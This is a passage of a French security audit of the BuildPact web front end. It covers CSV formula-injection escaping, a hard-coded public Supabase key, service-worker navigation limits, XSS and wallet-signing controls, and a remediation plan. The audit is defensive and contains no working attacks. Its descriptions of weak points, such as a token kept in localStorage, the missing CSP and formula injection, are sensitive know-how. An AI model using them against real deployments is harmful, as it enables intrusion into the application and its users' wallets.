**formules de tableur**. Une cellule commençant par `=`, `+`, `-` ou `@` est interprétée comme une formule par
Excel/LibreOffice/Sheets à l'ouverture. Aujourd'hui, les colonnes `detail` proviennent de valeurs serveur
(`xp_events.source`, `pact_events.kind`) et non de texte libre utilisateur — le risque est donc **latent**, mais il
s'activera dès qu'un champ libre arrivera dans cet export.

**Correctif.**

```ts
const escape = (v: string | number) => {
  let s = String(v);
  // Neutralisation des formules : un texte qui commence par = + - @ ou un
  // tabulation est interprété comme une formule par les tableurs.
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
```

---

### F-15 — INFO — Clé anon + URL de projet Supabase codées en dur dans le bundle

**Fichier** : `src/lib/supabaseClient.ts:11-17` (valeurs non reproduites ici)

**Analyse.** La clé Supabase `anon` est **publique par construction** (elle est embarquée dans tout client web ; la
sécurité repose sur les policies RLS, pas sur la clé). Ce n'est donc pas une fuite. Deux remarques :

1. le rôle du JWT est bien `anon` (vérifié) — pas de `service_role` égaré ;
2. conséquence de conception : `isRemoteEnabled` vaut **toujours `true`** (il y a toujours une clé de repli), donc
   l'app ne se désactive jamais vraiment — un opérateur qui configurait un autre projet Supabase verrait les deux
   cohabiter (l'environnement prioritaire, le repli en secours). C'est le comportement voulu (« l'interface ne se
   vide pas sans erreur visible »), mais cela mérite d'être écrit noir sur blanc dans la doc.

**Recommandation.** Documenter que cette valeur est publique par conception et que **toute** protection doit
reposer sur RLS ; ne jamais y faire évoluer un privilège. Le reste du dépôt le fait déjà très bien (voir §5).

---

### F-16 — INFO — `VITE_TOKENS_API_KEY` : voie d'exposition au build

**Fichier** : `src/components/WalletPanel.tsx:179` · `.env.example:104-125`

**Analyse.** La clé de l'API Tokens est lue via `import.meta.env.VITE_TOKENS_API_KEY` : **si elle est posée sur la
plateforme de déploiement, elle est recopiée en clair dans le bundle**. Le dépôt a anticipé le problème : la
documentation l'interdit explicitement, un script (`scripts/rpc-proxy.test.ts`, `scripts/rpc-endpoint-guard.test.ts`,
`scripts/history-secret-scan.mjs`) et un `npm run check:prod` relisent le bundle livré. **Vérification du bundle
actuel : aucune clé réelle n'y figure** — la seule occurrence de `api-key=` dans `dist/assets/index-*.js` est le
placeholder `https://devnet.helius-rpc.com/?api-key=...` du formulaire « RPC personnalisé ».

**Recommandation.** Ne pas s'arrêter à la convention : supprimer la lecture de `VITE_TOKENS_API_KEY` du code
front (la variable est reserved au dev local) et faire échouer le build si elle est présente en production
(`import.meta.env.PROD && import.meta.env.VITE_TOKENS_API_KEY && throw …`). Un contrôle qui dépend d'un `.env`
est un contrôle qui finira par échouer.

---

### F-17 — INFO — `dangerouslySetInnerHTML` dans un composant de chart non utilisé

**Fichier** : `src/components/ui/chart.tsx:79-100`

**Analyse.** C'est le **seul** `dangerouslySetInnerHTML` du front, et il est dans le composant shadcn `ChartStyle`,
qui construit une feuille CSS à partir d'un `ChartConfig` (shadcn) —Colors statiques. `ChartContainer` n'est
**utilisé nulle part** dans l'application (code mort, importé par personne) : le risque est nul aujourd'hui.

**Recommandation.** Supprimer le fichier, ou, s'il doit rester, le garder avec une règle explicite : *aucune valeur
issue d'une donnée ne doit entrer dans `config`*. Un `dangerouslySetInnerHTML` non utilisé reste une porte ouverte
pour le prochain développeur quicopiera le composant.

---

### F-18 — INFO — Service worker : navigation vers une URL fournie par le payload push

**Fichier** : `public/push-sw.js:38-52`

**Constat.** Au clic sur une notification, le worker fait `client.navigate(targetUrl)` puis, à défaut,
`self.clients.openWindow(targetUrl)`, où `targetUrl` vient du payload push (`data.url`). `openWindow` est contraint à
la même origine par le navigateur, mais `client.navigate()` peut emmener un onglet vers n'importe quelle URL.

**Scénario.** Le payload push est construit côté serveur (`triggerPushNotification`, `src/lib/pushNotifications.ts`)
avec `url: \`/#/pact/${pda}\`` — donc maîtrisé. Le risque n'existerait que si la chaîne de push devenait
injectable (compte push compromis, ou URL d'abonnement pilotée par l'utilisateur : `updatePushPrefs` signe un message
qui **contient l'endpoint** du push — `pushNotifications.ts:233-234` — donc l'endpoint est lié au wallet, ce qui est
bon).

**Recommandation.** Restreindre la navigation à l'origine :

```js
const cible = (() => {
  const u = new URL(targetUrl, self.location.origin);
  return (u.origin === self.location.origin) ? u.href : '/';
})();
```

---

### F-19 — INFO — `.env.example` documente une clé privée historiquement publiée (hors périmètre front)

**Fichier** : `.env.example:10-12`

**Constat.** Le fichier modèle indique : « Le fichier `contracts/target/wallet/wallet.json` a été retiré du dépôt :
il contenait une **clé privée publiée dans l'historique Git**. »

**Analyse.** Ce n'est pas un problème de front, et l'historique Git de ce clone ne contient plus le fichier (vérifié :
`git log --all --diff-filter=A --name-only` ne remonte que `.env.example` parmi les fichiers sensibles ; `.gitignore`
couvre `.env*` sauf `.env.example`). **Si un keypair a réellement été poussé, il faut considérer la clé comme
 compromise et la révoquer** — un simple `git rm` ne suffit pas : la clé reste dans l'historique et dans tous les
clones. Point de vigilance, hors périmètre de cet audit.

---

## 5. Ce qui est correct (à ne pas casser)

C'est la partie la plus longue de cet audit, et elle est importante : **le front est nettement au-dessus du niveau
habituel** sur la plupart des axes.

### 5.1 XSS — le risque est structurellement faible

| Contrôle | Where | État |
|---|---|---|
| Aucun `innerHTML` / `eval` / `new Function` / `document.write` / `insertAdjacentHTML` hors `chart.tsx` (non utilisé) | `src/**` | ✅ |
| Aucun `dangerouslySetInnerHTML` sur du contenu utilisateur | `src/**` | ✅ |
| Contenu utilisateur (pitch, bio, pseudo, chat, « à propos ») rendu en children React → échappement systématique | `src/components/**`, `src/pages/**` | ✅ |
| `href`/`src` contenant des données utilisateur → `sanitizeURL()` de React 19 neutralise `javascript:` | `react-dom` 19 | ✅ (dépendance du framework — cf. F-04) |
| Vidéo : URL restreinte à YouTube/Loom/Vimeo, ID filtré par regex `[\w-]+`/`\d+` → impossible d'injecter un hôte | `src/lib/media.ts:253-308`, `src/components/VideoEmbed.tsx` | ✅ |
| QR code : SVG passé en **data-URI dans un `<img>`**, pas en `innerHTML` (commentaire explicite dans le fichier) | `src/components/QrCode.tsx:11-13` | ✅ |
| Thème / palette : validés par `isPalette()` (liste stricte), jamais posés tels quels en `data-theme` | `src/lib/theme/palettes.ts:61-63` | ✅ |
| Cibles `_blank` : **toutes** portent un attribut `rel` (`noopener`/`noreferrer`) — vérifié sur les 17 fichiers concernés | `src/**` | ✅ |
| `postMessage` / écouteurs `message` : **aucun** | `src/**` | ✅ |
| `window.open` : **aucun** | `src/**` | ✅ |

### 5.2 Wallet — le périmètre est correctement tenu

- **Aucune clé privée, seed phrase, `secretKey`, `Keypair` ou `bip39` dans le front** (`rg` exhaustif sur `src/` :
  aucun résultat hors `idl/buildpact.json`, qui est un IDL public Anchor). Le front ne manipule que des
  `PublicKey`.
- **Aucun message à signer ne provient du réseau.** Les 16 appels à `signMessage()` construisent tous leur message
  localement, à partir de constantes de domaine (`BuildPact — session chat\nWallet: …\nProjet: …\nValidité: …`,
  `BuildPact — médias du projet\n…`, etc.). Il n'existe **aucun** « signer ce que le serveur a renvoyé ».
- **Chaque message signé est scopé** : wallet + ressource + timestamp, avec anti-replay (fenêtre de 5 min côté
  serveur) et, pour le chat, portée d'un seul projet.
- **Les actions sensibles passent par le wallet** (donc par son UI de confirmation) et l'UI **verrouille** les
  boutons pendant l'opération (`disabled={busy}`, `disabled={saving}`, `disabled={distributing}`) : pas de
  double-signature par double-clic.
- **Garde anti-double-dépense** dans `src/lib/anchor.ts:330-355` : avant tout retry, le statut de la signature
  précédente est vérifié → un `fund` ne peut pas être envoyé deux fois.
- **Le refus utilisateur n'est jamais rejoué** : `user rejected` / `WalletSignTransactionError` sont classés
  « fatals » et ne relancent pas de popup (`src/lib/anchor.ts:360-372`).
- **Le front n'accorde pas de privilège** : le contrôle d'autorisation réel est fait par les Edge Functions
  (`project-write` : le signataire doit être le `creator` lu **on-chain** ; `update-profile` : vérification de la
  signature ed25519 + anti-replay ; `chat-moderate` : le jeton de session est validé à chaque envoi).
- `signMessage` n'est jamais simulé : pas de « signature factice » de repli (`PremiumProfil.tsx:190-196` le dit
  explicitement).

### 5.3 Secrets dans le bundle — le dépôt est exemplaire

- **Aucune clé de production dans `dist/`** : la seule occurrence de `api-key=` est le placeholder du formulaire
  « RPC personnalisé » ; le relais RPC (`…/functions/v1/rpc`) ne porte aucun secret ; la clé Helius vit dans les
  secrets Supabase et n'est jamais lue par le front.
- **Aucune variable d'environnement RPC n'est lue** par `src/` (`VITE_RPC_ENDPOINT` et
  `VITE_REACT_APP_SOLANA_RPC_URL` ont été volontairement supprimés, y compris de `.env.example`).
- **Garde-fous automatisés** : `scripts/rpc-proxy.test.ts`, `scripts/rpc-endpoint-guard.test.ts`,
  `scripts/history-secret-scan.mjs`, `scripts/helius-key-audit.mjs`, `npm run check:prod` (qui relit **le bundle
  livré**, pas le code). C'est une discipline rare et Utile.
- **Masquage des URLs sensibles dans les journaux** : `src/lib/rpcMask.ts` réduit un endpoint à son `origin` — il
  n'existe aucun `console.log` d'endpoint complet ni de clé dans le front (`rg console.log src/` → **0 résultat**,
  seuls `console.warn` / `console.error` sont utilisés, et toujours sur des erreurs).
- `.gitignore` couvre `.env*` (sauf `.env.example`) ; `.env.local` ne contient qu'une clé **publique** VAPID.

### 5.4 Entrées non validées — les garde-fous sont là

- **Routage** : `#/pact/<pda>` validé par une regex base58 stricte (`src/lib/hashRoute.ts:59`) ; un PDA mal formé
  tombe sur une 404, pas sur une page bizarre ; les query params sont parsés en `URLSearchParams` et validés
  (`Number.isInteger`).
- **`localStorage` / `sessionStorage`** : **les 10 `JSON.parse` du front sont dans un `try/catch`** et le résultat est
  **ré-sanitisé** (`sanitizeProfile` avec contrôle de type et de longueur, `readStoredProfile` avec contrôle du
  `wallet` associé, `isDensity`/`isPalette` en liste stricte). `sessionStorage` des reçus de distribution est
  re-parsé sans `try` au niveau de l'appelant mais protégé par le `try` du helper (`PactCard.tsx:65-72`).
- **Prototype pollution** : le résolveur i18n filtre explicitement `__proto__` / `constructor` / `prototype` et
  utilise `hasOwnProperty` (`src/lib/i18n/translations.ts:57-73`) ; les fusions se font par spread (propriétés
  propres, pas de setter invoqué).
- **Uploads** : type MIME + taille validés côté client **et** côté serveur (allowlist stricte PNG/JPEG/WebP/GIF,
  2–5 Mo) ; le chemin de stockage est construit **côté serveur** à partir d'un PDA base58 validé et d'un `kind`
  en énumération → **pas de path traversal** ; l'écriture directe dans le bucket a été fermée (`upsert` réservé aux
  URLs signées, `20260828190000`).
- **Données locales** : le `bannerUrl`/`avatarUrl` coming du cache local est filtré par `^https://`
  (`src/lib/profile.ts:21`) — voir F-04 pour l'incohérence avec les liens.

### 5.5 Concurrence / état

- Aucune action on-chain n'est déclenchable en double : tous les boutons sensibles sont `disabled` pendant
  l'opération, et React flush entre deux événements discrets suffit à désarmiller le second clic.
- `anchor.ts` rejoue proprement les erreurs transitoires (429 / relais injoignable) avec backoff et rotation
  d'endpoint, sans rejouer les erreurs définitives, et **sans jamais re-signifier sur une erreur déterministe**.
- Le profil est lu en « cache local d'abord, serveur ensuite », avec un état `justSaved` prioritaire pendant le
  rafraîchissement, et une distinction fine entre « profil absent » et « serveur injoignable »
  (`fetchProfileDetailed` → `{status:'ok'|'error'}`) : l'UI ne ment pas sur l'état du backend.
- Les écrans de lecture ont un état `loading`/`error` distinct (pas de « 0 pact » qui serait un mensonge).

### 5.6 Dos navigateur

- **Pas de N+1** sur les listes : médias (`fetchAllProjectMedia`), rôles ouverts (`fetchAllOpenRoles`), profils
  (`fetchProfilesByWallets`), événements et XP sont chargés **en un seul appel** par entité.
- **Concurrence bornée** côté RPC (`mapLimit` dans `src/hooks/useProjects.ts:362`) — pas de `Promise.all` non borné
  sur un nombre arbitraire d'éléments.
- **Polling maîtrisé** : le Treasury rafraîchit toutes les 45 s (avec rechargement au retour de l'onglet), le chat
  re-vérifie sa session chaque minute ; les deux `setInterval` sont nettoyés dans le `cleanup`.
- **Aucun listener orphelin** : 24 `addEventListener` / 24 `removeEventListener` — l'équilibre est exact, fichier par
  fichier.
- **Canaux Realtime supprimés** à la desmontée (`removeChannel` dans `src/lib/chat.ts:321` et
  `src/lib/activity.ts:168`).
- **Cache de sonde mutualisé au niveau module** (`useRpcHealth.ts`) : une seule requête pour N ONGlets, TTL 60 s.
- Le QR code est mémoïsé (`useMemo`) — pas de recalcul de matrice à chaque frappe.

### 5.7 i18n — les deux langues sont synchronisées

Comparaison automatique (analyse statique des clés, indentation des objets TS) des six paires de dictionnaires :

| Paire | Clés FR | Clés EN | Écart |
|---|---|---|---|
| `fr.ts` / `en.ts` | 896 | 896 | **0** |
| `fr.v2.ts` / `en.v2.ts` | 88 | 88 | **0** |
| `fr.demo.ts` / `en.demo.ts` | 47 | 47 | **0** |
| `fr.rpcHealth.ts` / `en.rpcHealth.ts` | 23 | 23 | **0** |
| `fr.walletPanel.ts` / `en.walletPanel.ts` | 11 | 11 | **0** |
| `fr.settings.ts` / `en.settings.ts` | 46 | 46 | **0** |

Points positifs :

- le repli est **FR → clé brute** (`translate()`, `src/lib/i18n/translations.ts:87-98`) : pas d'écran vide, et
  l'avertissement `console.warn('[i18n] clé manquante')` n'existe qu'en DEV — donc **une clé manquante ne se voit
  pas en production** (c'est ce qui rend le contrôle automatisé indispensable ; cf. F-09 pour le cas des chaînes
  *hors dictionnaire*);
- l'interpolation `{{param}}` est faite par regex stricte (`\w+`) — pas d'injection de HTML possible par un
  placeholder mal nommé ;
- le résolveur refuse les segments dangereux (`__proto__`, `constructor`, `prototype`) — **prototype pollution
  explicitement traitée** ;
- `AVAILABILITY_META` / `SKILL_LEVEL_META` stockent des **clés** (`labelKey`) et non du texte : pas de langue
  figée dans les données métier (`src/lib/profile.ts:39-43`).

### 5.8 Accessibilité — correcte sur l'essentiel

- Les modales premium récentes respectent `role="dialog"` + `aria-modal` + fermeture Échap avec nettoyage du
  listener (`PremiumBuilderDetail.tsx:41-48`, `PremiumSettings.tsx:258-265`, `PremiumContactDialog.tsx:61-65`).
- Les groupes de boutons radio (étapes du wizard, choix de rôle) utilisent `role="group"` + `aria-labelledby`
  (`wizard/PactStep1.tsx:142,196`, `AddMemberModal.tsx:227`).
- Les états de chargement sont annoncés (`aria-hidden` sur les squelettes, `aria-label` sur les boutons icônes,
  `role="alert"` sur les bandeaux d'erreur — `PremiumPact.tsx:118`).
- Les liens externes ont tous `rel` + `target="_blank"` (cf. §5.1) — pas de *tabnabbing*.
- Le `lang` du document est déclaré (`<html lang="fr">`) — mais **il n'est pas mis à jour** au changement de langue
  (constat mineur, non comptabilisé : le `<html lang>` reste « fr » en session EN, ce qui perturbe les lecteurs
  d'écran et le SEO).

---

## 6. Plan de remédiation priorisé

| Priorité | Action | Constats | Effort |
|---|---|---|---|
| **P0 (jour)** | Ajouter `public/_headers` (CSP + HSTS + nosniff + frame-ancestors) | F-03 | ~30 min |
| **P0 (jour)** | Allowlist de schéma `http(s)` pour toutes les URLs fournies par l'utilisateur (front **et** Edge Functions) | F-04 | ~1 h |
| **P1 (semaine)** | Réduire la durée de vie utile du jeton de chat (2 h) et le garder d'abord en mémoire | F-01 | ~2 h |
| **P1 (semaine)** | Ne plus persister la clé BYOK en clair ; passer par un jeton de session serveur | F-02 | ~1 j |
| **P1 (semaine)** | Retirer `sourcemap` du build de production ; publier les `.map` hors du chemin public | F-05 | 10 min |
| **P2 (mois)** | Migrer les 5 modales legacy vers le composant `Dialog` (Radix déjà présent) | F-08 | ~0,5 j |
| **P2 (mois)** | Confirmeur in-app avant distribution (montant + nombre de bénéficiaires) | F-07 | ~1 h |
| **P2 (mois)** | RPC personnalisé : HTTPS obligatoire, et **lecture seule** (écritures réservées au relais) | F-06 | ~1 h |
| **P2 (mois)** | Neutraliser les formules dans l'export CSV ; messages d'erreur génériques ; bornage des requêtes Tokens | F-14, F-11, F-10 | ~2 h |
| **P3** | Migration des chaînes FR codées en dur vers le dictionnaire ; `AbortController` ; `sandbox` sur l'iframe ; suppression du `chart.tsx` mort | F-09, F-12, F-13, F-17 | ~1 j |

**Recommandation de gouvernance (la plus utile à long terme).** Le dépôt possède déjà la bonne discipline côté
secrets (`check:prod`, `rpc-proxy.test.ts`, `history-secret-scan.mjs`). Il manque l'équivalent côté **front** :

1. un test qui échoue si une URL issue d'une donnée distante est rendue dans un `href` sans passer par
   `estUrlWebSure()` ;
2. un test qui échoue si `import.meta.env.VITE_*` autre que la liste blanche (`VITE_SUPABASE_URL`,
   `VITE_SUPABASE_ANON_KEY`, `VITE_VAPID_PUBLIC_KEY`) est lue dans `src/` ;
3. un test de parité des dictionnaires i18n (le script de comparaison de clés de cet audit est directement
   réutilisable) ;
4. une règle ESLint (`no-restricted-syntax`) interdisant `dangerouslySetInnerHTML` et `innerHTML` hors d'une liste
   blanche explicitement revue.

---

## 7. Conclusion

Le front BuildPact est **soigné et défensif**. Les points que l'on vérifie en premier — XSS stocké, fuite de clé
privée, signature d'un message arbitraire, secret dans le bundle — sont **tous propres**, et pas seulement parce que
les contrôles manqueraient : ils sont là, documentés, commentés, et outillés (scripts de garde, tests de
non-régression, notes d'audit internes dans les fichiers).

Le risque dominant n'est **ni** le XSS stocké (bloqué par l'échappement React et par `sanitizeURL` de React 19),
**ni** le wallet (les 16 surfaces de signature sont scopées, anti-replay, et le contrôle d'autorisation est fait
côté serveur), **ni** les secrets dans le bundle (le bundle livré est propre, et la discipline de dépôt sur ce
point est réelle).

Le risque dominant est **le couple « stockage local de capacités + absence de CSP »** : un `localStorage` qui contient
un jeton d'écriture valable 24 h et une clé API tierce payante, dans une application qui ne pose **aucune**
politique de sécurité HTTP. Ce n'est pas exploitable seul, mais c'est exactement ce qui transforme le prochain
bug de rendu — une régression, un composant-framework, une dépendance — en incident sérieux. C'est aussi le
coût de remédiation le plus faible de toute la liste : une CSP, un TTL, une clé qui ne dort pas sur le disque.

Le reste (allowlist de schéma, sourcemaps, modales legacy, confirmation de distribution) est de l'assainissement
de qualité — à planifier, pas à urgenter.

---
*Audit réalisé en lecture seule. Aucun fichier du dépôt n'a été modifié. Aucun secret n'est reproduit dans ce
document.*
